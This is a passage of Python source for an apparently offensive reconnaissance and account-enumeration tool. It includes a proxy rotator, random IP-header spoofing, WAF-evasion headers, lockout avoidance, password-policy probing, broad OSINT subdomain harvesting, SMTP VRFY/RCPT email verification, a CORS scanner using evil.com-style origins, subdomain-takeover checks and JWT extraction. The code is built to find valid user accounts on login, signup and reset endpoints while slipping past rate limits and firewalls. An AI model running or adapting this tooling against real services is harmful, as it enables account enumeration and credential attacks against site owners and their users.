            pass

    def is_done(self, email: str, endpoint: str) -> bool:
        return f"{email}:{endpoint}" in self.completed_endpoints

    def mark_done(self, email: str, endpoint: str):
        self.completed_emails.add(email)
        self.completed_endpoints.add(f"{email}:{endpoint}")


# ---- Proxy Rotator ----

class ProxyRotator:
    def __init__(self, proxy_file: Optional[str] = None, test_url: str = "", parallel: bool = True):
        self.proxies: list[dict] = []
        self.dead: set[int] = set()
        self.index = 0

        if proxy_file and os.path.isfile(proxy_file):
            with open(proxy_file) as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    proxy = self._parse(line)
                    if proxy:
                        self.proxies.append(proxy)
            print(f"{Fore.GREEN}[+] Loaded {len(self.proxies)} proxies{Style.RESET_ALL}")
            if test_url:
                if parallel and len(self.proxies) > 1:
                    self._parallel_health_check(test_url)
                else:
                    self._health_check(test_url)

    def _parse(self, line: str) -> Optional[dict]:
        line = line.strip()
        if "://" not in line:
            if line.count(":") == 1:
                line = f"http://{line}"
            elif line.count(":") == 3:
                parts = line.split(":")
                line = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            else:
                line = f"http://{line}"
        proto = line.split("://")[0].lower()
        if proto in ("socks4", "socks5", "socks5h") and not HAS_PYSOCKS:
            return None
        return {"http": line, "https": line}

    def _health_check(self, test_url: str):
        alive = 0
        for i, proxy in enumerate(self.proxies):
            try:
                r = requests.get(test_url, proxies=proxy, timeout=10)
                if r.status_code < 500:
                    alive += 1
                else:
                    self.dead.add(i)
            except Exception:
                self.dead.add(i)
        print(f"  {Fore.GREEN}{alive}/{len(self.proxies)} proxies alive{Style.RESET_ALL}")

    def _parallel_health_check(self, test_url: str):
        def check_one(idx_proxy):
            idx, proxy = idx_proxy
            try:
                r = requests.get(test_url, proxies=proxy, timeout=10)
                return idx, r.status_code < 500
            except Exception:
                return idx, False

        alive = 0
        with ThreadPoolExecutor(max_workers=min(20, len(self.proxies))) as pool:
            for idx, is_alive in pool.map(check_one, enumerate(self.proxies)):
                if is_alive:
                    alive += 1
                else:
                    self.dead.add(idx)
        print(f"  {Fore.GREEN}{alive}/{len(self.proxies)} proxies alive (parallel check){Style.RESET_ALL}")

    def next(self) -> Optional[dict]:
        if not self.proxies:
            return None
        attempts = 0
        while attempts < len(self.proxies):
            idx = self.index % len(self.proxies)
            self.index += 1
            if idx not in self.dead:
                return self.proxies[idx]
            attempts += 1
        return None

    def random(self) -> Optional[dict]:
        if not self.proxies:
            return None
        alive = [p for i, p in enumerate(self.proxies) if i not in self.dead]
        return random.choice(alive) if alive else None

    def mark_dead(self, proxy: dict):
        for i, p in enumerate(self.proxies):
            if p == proxy:
                self.dead.add(i)
                break

    @property
    def alive_count(self) -> int:
        return len(self.proxies) - len(self.dead)


# ---- IP Spoofer ----

class IPSpoofer:
    def __init__(self, enabled: bool = True):
        self.enabled = enabled
        self.subnets = [
            (10, 0, 0), (172, 16, 0), (192, 168, 1),
            (203, 0, 113), (198, 51, 100), (100, 64, 0),
        ]

    def headers(self) -> dict:
        if not self.enabled:
            return {}
        ip = self._random_ip()
        chosen = random.sample(SPOOF_HEADERS_POOL, k=random.randint(2, 5))
        return {h: ip for h in chosen}

    def _random_ip(self) -> str:
        base = random.choice(self.subnets)
        return f"{base[0]}.{base[1]}.{random.randint(0,255)}.{random.randint(1,254)}"


# ---- Rate Limit Handler ----

class RateLimitHandler:
    def __init__(self, base_delay: float = 0.5, max_delay: float = 60.0):
        self.base_delay = base_delay
        self.max_delay = max_delay
        self.current_delay = base_delay
        self.consecutive_429 = 0
        self.total_429 = 0
        self.per_endpoint: dict[str, float] = {}

    def check(self, resp: requests.Response, endpoint: str) -> bool:
        if resp.status_code == 429:
            self.consecutive_429 += 1
            self.total_429 += 1
            retry_after = resp.headers.get("Retry-After", "")
            if retry_after.isdigit():
                wait = int(retry_after)
            else:
                wait = min(self.base_delay * (2 ** self.consecutive_429), self.max_delay)
            self.per_endpoint[endpoint] = wait
            self.current_delay = wait
            return True
        body = resp.text.lower()
        if any(sig in body for sig in RATE_LIMIT_SIGNALS) and resp.status_code in (200, 403):
            self.consecutive_429 += 1
            self.current_delay = min(self.base_delay * (2 ** self.consecutive_429), self.max_delay)
            self.per_endpoint[endpoint] = self.current_delay
            return True
        self.consecutive_429 = max(0, self.consecutive_429 - 1)
        if self.consecutive_429 == 0:
            self.current_delay = self.base_delay
        return False

    def wait(self, endpoint: str = ""):
        delay = self.per_endpoint.get(endpoint, self.current_delay)
        jitter = random.uniform(0, delay * 0.3)
        time.sleep(delay + jitter)

    @property
    def is_throttled(self) -> bool:
        return self.consecutive_429 >= 3


# ---- WAF Detector ----

class WAFDetector:
    def detect(self, resp: requests.Response) -> str:
        headers_lower = {k.lower(): v.lower() for k, v in resp.headers.items()}
        body_lower = resp.text.lower()[:2000]
        server = headers_lower.get("server", "")
        for waf_name, sigs in WAF_SIGNATURES.items():
            for sig in sigs:
                if sig in server or sig in body_lower:
                    return waf_name
                for hk, hv in headers_lower.items():
                    if sig in hk or sig in hv:
                        return waf_name
        if resp.status_code == 403 and ("access denied" in body_lower or "forbidden" in body_lower):
            return "generic_waf"
        return ""

    def evasion_headers(self, waf: str) -> dict:
        h = {}
        if waf == "cloudflare":
            h["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,*/*;q=0.8"
            h["Accept-Language"] = "en-US,en;q=0.5"
            h["Cache-Control"] = "no-cache"
            h["Pragma"] = "no-cache"
        elif waf == "akamai":
            h["Accept"] = "application/json"
            h["Accept-Encoding"] = "gzip, deflate"
        elif waf == "aws_waf":
            h["Accept"] = "application/json, text/plain, */*"
        return h


# ---- Lockout Detector ----

class LockoutDetector:
    def __init__(self, threshold: int = 5):
        self.threshold = threshold
        self.attempts: dict[str, int] = defaultdict(int)
        self.locked: set[str] = set()

    def record(self, endpoint: str, resp: requests.Response):
        body = resp.text.lower()
        lockout_signals = [
            "account is locked", "account locked", "temporarily locked",
            "too many failed", "account has been locked", "locked out",
            "max attempts", "maximum attempts", "suspended",
        ]
        if any(sig in body for sig in lockout_signals):
            self.locked.add(endpoint)
            return True
        self.attempts[endpoint] += 1
        return False

    def is_safe(self, endpoint: str) -> bool:
        if endpoint in self.locked:
            return False
        return self.attempts.get(endpoint, 0) < self.threshold


# ---- Password Policy Enumerator ----

class PasswordPolicyEnum:
    def __init__(self):
        self.policies: dict[str, dict] = {}

    def probe(self, session_fn, ep: EndpointInfo) -> dict:
        if ep.vector not in (Vector.REGISTER, Vector.LOGIN):
            return {}
        test_passwords = [
            ("a", "too_short"),
            ("aaaaaaaa", "no_uppercase_or_special"),
            ("AAAAAAAA", "no_lowercase"),
            ("Aaaa1111", "no_special"),
            ("Aa1!Aa1!", "should_pass"),
            ("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "too_long_check"),
        ]
        policy = {"min_length": None, "requires_upper": None, "requires_special": None, "requires_number": None}
        fake_email = f"policychk_{hashlib.md5(os.urandom(4)).hexdigest()[:6]}@example.com"
        for pwd, label in test_passwords:
            resp, _ = session_fn(ep, fake_email, override_password=pwd)
            if resp is None:
                continue
            body = resp.text.lower()
            if "too short" in body or "minimum" in body or "at least" in body:
                match = re.search(r'(\d+)\s*character', body)
                if match:
                    policy["min_length"] = int(match.group(1))
            if "uppercase" in body or "capital" in body:
                policy["requires_upper"] = True
            if "special" in body or "symbol" in body:
                policy["requires_special"] = True
            if "number" in body or "digit" in body:
                policy["requires_number"] = True
        self.policies[ep.url] = policy
        return policy


# ---- Subdomain Discovery ----

class OSINTRecon:
    def __init__(self, target: str, request_fn, verbose: bool = False):
        self.target = target
        self._request = request_fn
        self.verbose = verbose
        parsed = urllib.parse.urlparse(target)
        self.hostname = parsed.hostname or ""
        parts = self.hostname.split(".")
        self.root_domain = ".".join(parts[-2:]) if len(parts) >= 2 else self.hostname
        self.subdomains: set[str] = set()
        self.emails_found: set[str] = set()
        self.endpoints_found: list[str] = []
        self.tech_info: dict[str, Any] = {}
        self.historical_urls: list[str] = []

    def run_all(self) -> dict:
        print(f"\n{Fore.CYAN}[*] OSINT Recon: Querying third-party sources{Style.RESET_ALL}")
        sources = [
            ("crt.sh", self._crtsh),
            ("RapidDNS", self._rapiddns),
            ("HackerTarget", self._hackertarget),
            ("BufferOver", self._bufferover),
            ("AlienVault OTX", self._alienvault_otx),
            ("URLScan.io", self._urlscan),
            ("ThreatCrowd", self._threatcrowd),
            ("Wayback Machine", self._wayback),
            ("Wayback URLs", self._wayback_urls),
            ("Archive.org CDX", self._archive_cdx),
            ("ViewDNS", self._viewdns_info),
            ("DNS Dumpster style", self._dns_bruteforce),
            ("ThreatMiner", self._threatminer),
            ("Riddler.io", self._riddler),
            ("CommonCrawl Index", self._commoncrawl),
            ("Web Archive Sitemap", self._web_archive_sitemap),
        ]
        with ThreadPoolExecutor(max_workers=8) as pool:
            futures = {}
            for name, fn in sources:
                futures[pool.submit(fn)] = name
            for future in as_completed(futures):
                name = futures[future]
                try:
                    future.result()
                except Exception as e:
                    if self.verbose:
                        print(f"  {Fore.YELLOW}[OSINT] {name}: {e}{Style.RESET_ALL}")

        print(f"  {Fore.GREEN}[OSINT] Subdomains: {len(self.subdomains)} | Historical URLs: {len(self.historical_urls)} | Emails: {len(self.emails_found)}{Style.RESET_ALL}")
        return {
            "subdomains": list(self.subdomains),
            "emails": list(self.emails_found),
            "historical_urls": self.historical_urls,
            "tech_info": self.tech_info,
        }

    def _safe_get(self, url: str, timeout: int = 10) -> Optional[requests.Response]:
        try:
            r = self._request("GET", url, timeout=timeout)
            return r
        except Exception:
            return None

    def _crtsh(self):
        r = self._safe_get(f"https://crt.sh/?q=%.{self.root_domain}&output=json", timeout=15)
        if r and r.status_code == 200:
            try:
                certs = r.json()
                for cert in certs:
                    name = cert.get("name_value", "")
                    for line in name.split("\n"):
                        line = line.strip().lower()
                        if line and "*" not in line and line.endswith(self.root_domain):
                            self.subdomains.add(line)
                print(f"  {Fore.GREEN}[crt.sh] {len(self.subdomains)} subdomains from certificates{Style.RESET_ALL}")
            except Exception:
                pass

    def _rapiddns(self):
        r = self._safe_get(f"https://rapiddns.io/subdomain/{self.root_domain}?full=1")
        if r and r.status_code == 200 and HAS_BS4:
            soup = BeautifulSoup(r.text, "html.parser")
            for td in soup.find_all("td"):
                text = td.get_text(strip=True).lower()
                if text.endswith(self.root_domain) and " " not in text:
                    self.subdomains.add(text)
            if self.verbose:
                print(f"  {Fore.GREEN}[RapidDNS] queried{Style.RESET_ALL}")

    def _hackertarget(self):
        r = self._safe_get(f"https://api.hackertarget.com/hostsearch/?q={self.root_domain}")
        if r and r.status_code == 200 and "error" not in r.text.lower():
            for line in r.text.strip().split("\n"):
                parts = line.split(",")
                if parts and parts[0].strip().endswith(self.root_domain):
                    self.subdomains.add(parts[0].strip().lower())
            if self.verbose:
                print(f"  {Fore.GREEN}[HackerTarget] queried{Style.RESET_ALL}")

    def _bufferover(self):
        r = self._safe_get(f"https://dns.bufferover.run/dns?q=.{self.root_domain}")
        if r and r.status_code == 200:
            try:
                data = r.json()
                for record in data.get("FDNS_A", []) + data.get("RDNS", []):
                    if isinstance(record, str):
                        parts = record.split(",")
                        for p in parts:
                            p = p.strip().lower()
                            if p.endswith(self.root_domain):
                                self.subdomains.add(p)
            except Exception:
                pass

    def _alienvault_otx(self):
        r = self._safe_get(f"https://otx.alienvault.com/api/v1/indicators/domain/{self.root_domain}/passive_dns")
        if r and r.status_code == 200:
            try:
                data = r.json()
                for record in data.get("passive_dns", []):
                    hostname = record.get("hostname", "").lower()
                    if hostname.endswith(self.root_domain):
                        self.subdomains.add(hostname)
                if self.verbose:
                    print(f"  {Fore.GREEN}[AlienVault OTX] {len(data.get('passive_dns', []))} DNS records{Style.RESET_ALL}")
            except Exception:
                pass

    def _urlscan(self):
        r = self._safe_get(f"https://urlscan.io/api/v1/search/?q=domain:{self.root_domain}&size=100")
        if r and r.status_code == 200:
            try:
                data = r.json()
                for result in data.get("results", []):
                    page = result.get("page", {})
                    domain = page.get("domain", "").lower()
                    url = page.get("url", "")
                    if domain.endswith(self.root_domain):
                        self.subdomains.add(domain)
                    if url and any(kw in url.lower() for kw in
                                   ("login", "signin", "signup", "register", "auth", "api", "forgot", "reset")):
                        self.historical_urls.append(url)
                if self.verbose:
                    print(f"  {Fore.GREEN}[URLScan] {len(data.get('results', []))} results{Style.RESET_ALL}")
            except Exception:
                pass

    def _threatcrowd(self):
        r = self._safe_get(f"https://www.threatcrowd.org/searchApi/v2/domain/report/?domain={self.root_domain}")
        if r and r.status_code == 200:
            try:
                data = r.json()
                for sub in data.get("subdomains", []):
                    self.subdomains.add(sub.lower())
                for email in data.get("emails", []):
                    if "@" in email:
                        self.emails_found.add(email.lower())
            except Exception:
                pass

    def _wayback(self):
        r = self._safe_get(f"https://web.archive.org/web/timemap/json?url={self.root_domain}&matchType=domain&limit=500&output=json&fl=original&collapse=urlkey")
        if r and r.status_code == 200:
            try:
                data = r.json()
                for entry in data[1:]:
                    url = entry[0] if isinstance(entry, list) else str(entry)
                    lower = url.lower()
                    if any(kw in lower for kw in
                           ("login", "signin", "signup", "register", "auth", "api",
                            "forgot", "reset", "password", "account", "user", "email",
                            "verify", "check", "otp", "session", "token")):
                        self.historical_urls.append(url)
            except Exception:
                pass

    def _wayback_urls(self):
        r = self._safe_get(f"https://web.archive.org/cdx/search/cdx?url=*.{self.root_domain}/*&output=json&fl=original&collapse=urlkey&limit=200")
        if r and r.status_code == 200:
            try:
                data = r.json()
                for entry in data[1:]:
                    url = entry[0] if isinstance(entry, list) else str(entry)
                    parsed = urllib.parse.urlparse(url)
                    if parsed.hostname:
                        self.subdomains.add(parsed.hostname.lower())
                    lower = url.lower()
                    if any(kw in lower for kw in ("api", "auth", "login", "signup", "register", "forgot")):
                        self.historical_urls.append(url)
            except Exception:
                pass

    def _archive_cdx(self):
        paths = ["login", "signin", "signup", "register", "forgot-password", "api"]
        for p in paths:
            r = self._safe_get(f"https://web.archive.org/cdx/search/cdx?url={self.hostname}/{p}*&output=json&fl=original,statuscode&collapse=urlkey&limit=50")
            if r and r.status_code == 200:
                try:
                    data = r.json()
                    for entry in data[1:]:
                        if isinstance(entry, list) and len(entry) >= 1:
                            self.historical_urls.append(entry[0])
                except Exception:
                    pass

    def _viewdns_info(self):
        r = self._safe_get(f"https://viewdns.info/reverseip/?host={self.hostname}&t=1")
        if r and r.status_code == 200 and HAS_BS4:
            soup = BeautifulSoup(r.text, "html.parser")
            for td in soup.find_all("td"):
                text = td.get_text(strip=True).lower()
                if "." in text and " " not in text and len(text) < 100:
                    if text.endswith(self.root_domain):
                        self.subdomains.add(text)

    def _dns_bruteforce(self):
        extra_prefixes = [
            "api2", "api3", "apiv2", "api-v2", "api-v1",
            "auth2", "auth-api", "identity", "identity-api",
            "accounts-api", "user-api", "login-api",
            "gateway", "gw", "edge", "proxy",
            "api-gateway", "api-gw", "rest", "rest-api",
            "services", "service", "backend", "bff",
            "www", "web", "cdn", "static",
            "sandbox", "preview", "canary", "next",
            "v1", "v2", "v3", "old", "legacy", "new",
        ]
        parsed = urllib.parse.urlparse(self.target)
        scheme = parsed.scheme or "https"

        def check(prefix):
            try:
                host = f"{prefix}.{self.root_domain}"
                socket.getaddrinfo(host, None, socket.AF_INET, socket.SOCK_STREAM)
                return host
            except (socket.gaierror, OSError):
                return None

        with ThreadPoolExecutor(max_workers=20) as pool:
            futures = {pool.submit(check, p): p for p in extra_prefixes}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    self.subdomains.add(result)

    def _threatminer(self):
        r = self._safe_get(f"https://api.threatminer.org/v2/domain.php?q={self.root_domain}&rt=5")
        if r and r.status_code == 200:
            try:
                data = r.json()
                for sub in data.get("results", []):
                    if isinstance(sub, str) and sub.endswith(self.root_domain):
                        self.subdomains.add(sub.lower())
            except Exception:
                pass

    def _riddler(self):
        r = self._safe_get(f"https://riddler.io/search/exportcsv?q=pld:{self.root_domain}")
        if r and r.status_code == 200:
            for line in r.text.strip().split("\n")[1:]:
                parts = line.split(",")
                for p in parts:
                    p = p.strip().strip('"').lower()
                    if p.endswith(self.root_domain) and " " not in p:
                        self.subdomains.add(p)

    def _commoncrawl(self):
        r = self._safe_get(f"https://index.commoncrawl.org/CC-MAIN-2024-10-index?url=*.{self.root_domain}&output=json&limit=100")
        if r and r.status_code == 200:
            for line in r.text.strip().split("\n"):
                try:
                    entry = json.loads(line)
                    url = entry.get("url", "")
                    if url:
                        parsed = urllib.parse.urlparse(url)
                        if parsed.hostname:
                            self.subdomains.add(parsed.hostname.lower())
                        lower = url.lower()
                        if any(kw in lower for kw in ("api", "auth", "login", "register", "signup", "forgot")):
                            self.historical_urls.append(url)
                except json.JSONDecodeError:
                    pass

    def _web_archive_sitemap(self):
        r = self._safe_get(f"https://web.archive.org/web/20240101*/https://{self.hostname}/sitemap.xml")
        if r and r.status_code == 200:
            locs = re.findall(r'https?://[^"<>\s]+', r.text)
            for loc in locs:
                lower = loc.lower()
                if any(kw in lower for kw in ("login", "signin", "signup", "register", "auth", "api", "forgot")):
                    self.historical_urls.append(loc)

    def get_auth_subdomains(self) -> list[str]:
        auth_keywords = ("api", "auth", "login", "sso", "id", "accounts", "account",
                         "identity", "gateway", "gw", "oauth", "connect", "user",
                         "app", "my", "portal", "m", "mobile", "rest", "graphql",
                         "services", "backend", "edge", "bff")
        result = []
        parsed = urllib.parse.urlparse(self.target)
        scheme = parsed.scheme or "https"
        for sub in self.subdomains:
            prefix = sub.replace(f".{self.root_domain}", "").lower()
            if any(kw in prefix for kw in auth_keywords):
                url = f"{scheme}://{sub}"
                result.append(url)
        return result

    def get_historical_endpoints(self) -> list[EndpointInfo]:
        seen = set()
        results = []
        vector_map = {
            Vector.LOGIN: ["login", "signin", "auth/sign", "session", "authenticate"],
            Vector.REGISTER: ["register", "signup", "sign-up", "create-account", "join"],
            Vector.PASSWORD_RESET: ["forgot", "reset", "recover", "password"],
            Vector.DIRECT_CHECK: ["check", "exists", "validate", "verify", "availability"],
            Vector.OTP: ["otp", "2fa", "mfa", "send-code"],
            Vector.GRAPHQL: ["graphql", "gql"],
        }
        for url in self.historical_urls:
            if url in seen:
                continue
            seen.add(url)
            lower = url.lower()
            vector = Vector.UNKNOWN
            for v, kws in vector_map.items():
                if any(kw in lower for kw in kws):
                    vector = v
                    break
            results.append(EndpointInfo(url=url, vector=vector))
        return results


class SubdomainDiscovery:
    COMMON_PREFIXES = [
        "api", "app", "auth", "accounts", "login", "sso", "id",
        "my", "portal", "dashboard", "admin", "user", "users",
        "register", "signup", "billing", "pay", "m", "mobile",
        "stage", "staging", "dev", "beta", "test", "internal",
        "graphql", "gql", "oauth", "connect",
    ]

    def __init__(self, target: str, request_fn):
        self.target = target
        self._request = request_fn
        self.found: list[str] = []

    def discover(self) -> list[str]:
        parsed = urllib.parse.urlparse(self.target)
        base_domain = parsed.hostname or ""
        scheme = parsed.scheme or "https"
        parts = base_domain.split(".")
        if len(parts) < 2:
            return []
        root = ".".join(parts[-2:])
        found = []

        def check_sub(prefix):
            sub = f"{scheme}://{prefix}.{root}"
            try:
                r = self._request("GET", sub, timeout=8)
                if r and r.status_code < 500:
                    return sub
            except Exception:
                pass
            return None

        with ThreadPoolExecutor(max_workers=10) as pool:
            futures = {pool.submit(check_sub, p): p for p in self.COMMON_PREFIXES}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    found.append(result)

        self.found = found
        return found


# ================================================================
#  v3.4 ADVANCED MODULES
# ================================================================

class SMTPVerifier:
    def __init__(self, timeout: int = 10, verbose: bool = False):
        self.timeout = timeout
        self.verbose = verbose
        self._mx_cache: dict[str, list[str]] = {}

    def _get_mx(self, domain: str) -> list[str]:
        if domain in self._mx_cache:
            return self._mx_cache[domain]
        import subprocess
        mx_hosts = []
        try:
            result = subprocess.run(
                ["dig", "+short", "MX", domain],
                capture_output=True, text=True, timeout=self.timeout
            )
            for line in result.stdout.strip().split("\n"):
                parts = line.strip().split()
                if len(parts) >= 2:
                    mx_hosts.append(parts[1].rstrip("."))
        except Exception:
            pass
        if not mx_hosts:
            try:
                result = subprocess.run(
                    ["nslookup", "-type=MX", domain],
                    capture_output=True, text=True, timeout=self.timeout
                )
                for line in result.stdout.split("\n"):
                    if "mail exchanger" in line.lower():
                        parts = line.strip().split()
                        mx_hosts.append(parts[-1].rstrip("."))
            except Exception:
                pass
        self._mx_cache[domain] = mx_hosts
        return mx_hosts

    def verify_email(self, email: str) -> dict:
        domain = email.split("@")[-1] if "@" in email else ""
        result = {"email": email, "mx_exists": False, "smtp_vrfy": None, "smtp_rcpt": None, "catchall": None}
        mx_hosts = self._get_mx(domain)
        if not mx_hosts:
            return result
        result["mx_exists"] = True
        for mx in mx_hosts[:2]:
            try:
                sock = socket.create_connection((mx, 25), timeout=self.timeout)
                banner = sock.recv(1024).decode(errors="ignore")
                if "220" not in banner:
                    sock.close()
                    continue
                sock.sendall(b"EHLO enumcheck.local\r\n")
                sock.recv(1024)
                sock.sendall(f"MAIL FROM:<probe@enumcheck.local>\r\n".encode())
                sock.recv(1024)
                sock.sendall(f"VRFY {email}\r\n".encode())
                vrfy_resp = sock.recv(1024).decode(errors="ignore")
                if "250" in vrfy_resp or "252" in vrfy_resp:
                    result["smtp_vrfy"] = "exists"
                elif "550" in vrfy_resp or "551" in vrfy_resp or "553" in vrfy_resp:
                    result["smtp_vrfy"] = "not_found"
                elif "502" in vrfy_resp or "252" in vrfy_resp:
                    result["smtp_vrfy"] = "disabled"
                sock.sendall(f"RCPT TO:<{email}>\r\n".encode())
                rcpt_resp = sock.recv(1024).decode(errors="ignore")
                if "250" in rcpt_resp or "251" in rcpt_resp:
                    result["smtp_rcpt"] = "accepted"
                elif "550" in rcpt_resp or "551" in rcpt_resp or "553" in rcpt_resp:
                    result["smtp_rcpt"] = "rejected"
                elif "452" in rcpt_resp or "421" in rcpt_resp:
                    result["smtp_rcpt"] = "greylisted"
                fake = f"nonexist_{hashlib.md5(os.urandom(4)).hexdigest()[:8]}@{domain}"
                sock.sendall(f"RCPT TO:<{fake}>\r\n".encode())
                fake_resp = sock.recv(1024).decode(errors="ignore")
                if "250" in fake_resp:
                    result["catchall"] = True
                else:
                    result["catchall"] = False
                sock.sendall(b"QUIT\r\n")
                sock.close()
                break
            except Exception as e:
                if self.verbose:
                    print(f"    {Fore.YELLOW}[SMTP] {mx}: {e}{Style.RESET_ALL}")
                continue
        return result


class DNSIntelligence:
    def __init__(self, target: str, verbose: bool = False):
        parsed = urllib.parse.urlparse(target)
        self.hostname = parsed.hostname or ""
        parts = self.hostname.split(".")
        self.domain = ".".join(parts[-2:]) if len(parts) >= 2 else self.hostname
        self.verbose = verbose
        self.mx_records: list[str] = []
        self.spf_record: str = ""
        self.dmarc_record: str = ""
        self.ns_records: list[str] = []
        self.txt_records: list[str] = []
        self.cname_records: dict[str, str] = {}
        self.a_records: list[str] = []
        self.cloud_provider: str = ""
        self.email_provider: str = ""

    def _dig(self, record_type: str, domain: str = "") -> str:
        import subprocess
        target = domain or self.domain
        try:
            r = subprocess.run(
                ["dig", "+short", record_type, target],
                capture_output=True, text=True, timeout=10
            )
            return r.stdout.strip()
        except Exception:
            return ""

    def gather(self) -> dict:
        for line in self._dig("MX").split("\n"):
            parts = line.strip().split()
            if len(parts) >= 2:
                self.mx_records.append(parts[-1].rstrip("."))
        for line in self._dig("TXT").split("\n"):
            line = line.strip().strip('"')
            self.txt_records.append(line)
            if line.startswith("v=spf1"):
                self.spf_record = line
        dmarc = self._dig("TXT", f"_dmarc.{self.domain}")
        for line in dmarc.split("\n"):
            line = line.strip().strip('"')
            if "v=DMARC" in line.upper():
                self.dmarc_record = line
        for line in self._dig("NS").split("\n"):
            ns = line.strip().rstrip(".")
            if ns:
                self.ns_records.append(ns)
        for line in self._dig("A", self.hostname).split("\n"):
            ip = line.strip()
            if ip and re.match(r'^\d+\.\d+\.\d+\.\d+$', ip):
                self.a_records.append(ip)
        self._detect_cloud()
        self._detect_email_provider()
        return {
            "mx": self.mx_records, "spf": self.spf_record,
            "dmarc": self.dmarc_record, "ns": self.ns_records,
            "a": self.a_records, "cloud": self.cloud_provider,
            "email_provider": self.email_provider,
        }

    def _detect_cloud(self):
        all_text = " ".join(self.a_records + self.ns_records + self.txt_records)
        cloud_sigs = {
            "AWS": ["amazonaws", "aws", "ec2", "elb", "cloudfront"],
            "GCP": ["google", "gcp", "googlecloud", "ghs.google"],
            "Azure": ["azure", "microsoft", "outlook", "msft"],
            "Cloudflare": ["cloudflare", "cf-"],
            "Fastly": ["fastly"],
            "Akamai": ["akamai", "edgesuite", "edgekey"],
            "DigitalOcean": ["digitalocean"],
            "Heroku": ["heroku", "herokuapp"],
            "Vercel": ["vercel", "now.sh"],
            "Netlify": ["netlify"],
        }
        for provider, sigs in cloud_sigs.items():
            if any(s in all_text.lower() for s in sigs):
                self.cloud_provider = provider
                break
        if not self.cloud_provider and self.a_records:
            ip_ranges = {
                "AWS": [("3.", "52."), ("54.",), ("13.",), ("18.",)],
                "GCP": [("34.",), ("35.",)],
                "Azure": [("20.",), ("40.",), ("52.1",)],
                "Cloudflare": [("104.16",), ("104.17",), ("104.18",), ("172.6",), ("1.1.",)],
            }
            for provider, prefixes in ip_ranges.items():
                for ip in self.a_records:
                    for prefix_group in prefixes:
                        if any(ip.startswith(p) for p in prefix_group):
                            self.cloud_provider = provider
                            break
                    if self.cloud_provider:
                        break
                if self.cloud_provider:
                    break

    def _detect_email_provider(self):
        mx_text = " ".join(self.mx_records).lower()
        providers = {
            "Google Workspace": ["google", "gmail", "aspmx"],
            "Microsoft 365": ["outlook", "microsoft", "office365"],
            "Zoho": ["zoho"],
            "ProtonMail": ["proton", "protonmail"],
            "Fastmail": ["fastmail"],
            "Mailgun": ["mailgun"],
            "SendGrid": ["sendgrid"],
            "Amazon SES": ["amazonaws", "aws"],
            "Mimecast": ["mimecast"],
            "Barracuda": ["barracuda"],
        }
        for provider, sigs in providers.items():
            if any(s in mx_text for s in sigs):
                self.email_provider = provider
                break


class CORSScanner:
    def __init__(self, request_fn, target: str):
        self._request = request_fn
        self.target = target
        self.findings: list[dict] = []

    def scan(self, endpoints: list[EndpointInfo]) -> list[dict]:
        test_origins = [
            "https://evil.com",
            "https://attacker.com",
            "null",
            f"https://{urllib.parse.urlparse(self.target).hostname}.evil.com",
            f"https://evil.{urllib.parse.urlparse(self.target).hostname}",
        ]
        urls_to_check = [self.target] + [ep.url for ep in endpoints[:10]]
        for url in urls_to_check:
            for origin in test_origins:
                try:
                    headers = {"Origin": origin}
                    resp = self._request("GET", url, headers=headers)
                    if resp is None:
                        continue
                    acao = resp.headers.get("Access-Control-Allow-Origin", "")
                    acac = resp.headers.get("Access-Control-Allow-Credentials", "")
                    if acao == origin or acao == "*":
                        finding = {
                            "url": url, "origin": origin,
                            "acao": acao, "credentials": acac.lower() == "true",
                            "severity": "high" if acac.lower() == "true" else "medium",
                        }
                        self.findings.append(finding)
                except Exception:
                    pass
        return self.findings


class SubdomainTakeoverChecker:
    DANGLING_SIGS = {
        "GitHub Pages": ["there isn't a github pages site here", "for root urls"],
        "Heroku": ["no such app", "herokucdn.com/error-pages"],
        "AWS S3": ["nosuchbucket", "the specified bucket does not exist"],
        "Shopify": ["sorry, this shop is currently unavailable"],
        "Tumblr": ["there's nothing here", "whatever you were looking for"],
        "WordPress.com": ["do you want to register"],
        "Squarespace": ["website expired"],
        "Zendesk": ["help center closed"],
        "Fastly": ["fastly error: unknown domain"],
        "Pantheon": ["404 error unknown site"],
        "Surge.sh": ["project not found"],
        "Fly.io": ["404 not found"],
        "Cargo": ["cargocollective.com"],
        "Ghost": ["the thing you were looking for is no longer here"],
        "Bitbucket": ["repository not found"],
        "Unbounce": ["the requested url was not found"],
    }

    def __init__(self, request_fn, verbose: bool = False):
        self._request = request_fn
        self.verbose = verbose
        self.vulnerable: list[dict] = []

    def check(self, subdomains: list[str]) -> list[dict]:
        import subprocess
        for sub in subdomains:
            parsed = urllib.parse.urlparse(sub)
            host = parsed.hostname or sub
            try:
                result = subprocess.run(
                    ["dig", "+short", "CNAME", host],
                    capture_output=True, text=True, timeout=5
                )
                cname = result.stdout.strip().rstrip(".")
                if not cname:
                    continue
                resp = self._request("GET", sub, timeout=8)
                if resp is None:
                    self.vulnerable.append({
                        "subdomain": sub, "cname": cname,
                        "reason": "connection_failed", "service": "unknown",
                    })
                    continue
                body = resp.text.lower()
                for service, sigs in self.DANGLING_SIGS.items():
                    if any(sig in body for sig in sigs):
                        self.vulnerable.append({
                            "subdomain": sub, "cname": cname,
                            "reason": "dangling_cname", "service": service,
                        })
                        break
            except Exception:
                pass
        return self.vulnerable


class JWTAnalyzer:
    @staticmethod
    def extract_jwts(response: requests.Response) -> list[dict]:
        tokens = []
        jwt_pattern = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+')
        sources = [
            response.text or "",
            response.headers.get("Authorization", ""),
            response.headers.get("Set-Cookie", ""),
            response.headers.get("X-Auth-Token", ""),
            response.headers.get("X-Access-Token", ""),
        ]
        for source in sources:
            for match in jwt_pattern.findall(source):
                decoded = JWTAnalyzer._decode_jwt(match)
                if decoded:
                    tokens.append(decoded)
        return tokens

    @staticmethod
    def _decode_jwt(token: str) -> Optional[dict]:
        import base64
        parts = token.split(".")
        if len(parts) != 3:
            return None
        try:
            header_b64 = parts[0] + "=" * (4 - len(parts[0]) % 4)
            payload_b64 = parts[1] + "=" * (4 - len(parts[1]) % 4)
            header = json.loads(base64.urlsafe_b64decode(header_b64))
